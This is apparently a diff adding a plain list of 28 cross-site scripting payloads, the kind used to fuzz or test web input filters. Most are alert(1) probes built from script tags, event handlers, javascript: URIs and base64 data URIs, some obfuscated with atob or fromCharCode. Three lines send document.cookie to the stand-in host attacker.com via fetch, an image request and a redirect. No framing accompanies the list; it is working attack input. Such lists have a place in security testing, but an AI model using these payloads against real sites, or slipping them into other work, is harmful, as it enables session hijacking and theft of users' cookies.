@@ -1,0 +1,28 @@
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<svg/onload=alert(1)>
+javascript:alert(1)
+<img src=x onerror="javascript:alert(1)">
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<svg><script>alert(1)</script>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)><option>1</option><option>2</option></select>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src="x" onmouseover="alert(1)">
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<script>fetch('http://attacker.com/'+document.cookie)</script>
+<script>new Image().src="http://attacker.com/"+document.cookie;</script>
+<script>window.location='http://attacker.com/?cookie='+document.cookie</script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=# onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<link rel=import href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
